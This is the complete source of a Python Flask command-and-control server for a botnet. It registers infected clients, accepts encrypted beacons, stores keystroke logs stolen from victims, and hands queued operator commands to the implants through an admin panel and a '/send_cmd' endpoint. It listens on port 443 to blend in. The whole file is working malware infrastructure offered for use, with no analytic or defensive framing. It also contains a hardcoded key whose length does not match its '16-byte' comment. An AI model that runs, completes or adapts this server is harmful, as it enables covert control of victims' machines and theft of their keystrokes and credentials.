# C2 SERVER (Python 3.10+)
# Run: python c2_server.py
import sqlite3
from flask import Flask, request, jsonify, render_template
import threading
import time
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

app = Flask(__name__)
DB_NAME = "botnet.db"
KEY = b'MRMONSIFH4CK3R420'  # 16-byte AES key

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id TEXT PRIMARY KEY, ip TEXT, last_seen REAL, os TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id TEXT, log TEXT, timestamp REAL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id TEXT, command TEXT, status TEXT)''')
    conn.commit()
    conn.close()

def aes_encrypt(data):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size))).decode()

def aes_decrypt(enc_data):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(base64.b64decode(enc_data)), AES.block_size).decode()

@app.route('/beacon', methods=['POST'])
def beacon():
    try:
        data = request.json
        decrypted = aes_decrypt(data['payload'])
        client_id = decrypted.split('|')[0]
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO clients VALUES (?, ?, ?, ?)", 
                 (client_id, request.remote_addr, time.time(), "Windows"))
        
        # Store keylogs if present
        if 'KEYLOGS' in decrypted:
            log_data = decrypted.split('KEYLOGS:')[1]
            c.execute("INSERT INTO keylogs VALUES (?, ?, ?)", 
                     (client_id, log_data, time.time()))
        
        # Check for pending commands
        c.execute("SELECT command FROM commands WHERE id=? AND status='PENDING'", (client_id,))
        pending = c.fetchone()
        response = aes_encrypt(pending[0]) if pending else aes_encrypt("NO_CMD")
        
        conn.commit()
        conn.close()
        return response
    except:
        return aes_encrypt("ERROR")

@app.route('/admin')
def admin_panel():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM clients")
    clients = c.fetchall()
    return render_template('panel.html', clients=clients)

@app.route('/send_cmd', methods=['POST'])
def send_command():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO commands VALUES (?, ?, ?)", 
             (request.form['client_id'], request.form['command'], 'PENDING'))
    conn.commit()
    conn.close()
    return "Command queued!"

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')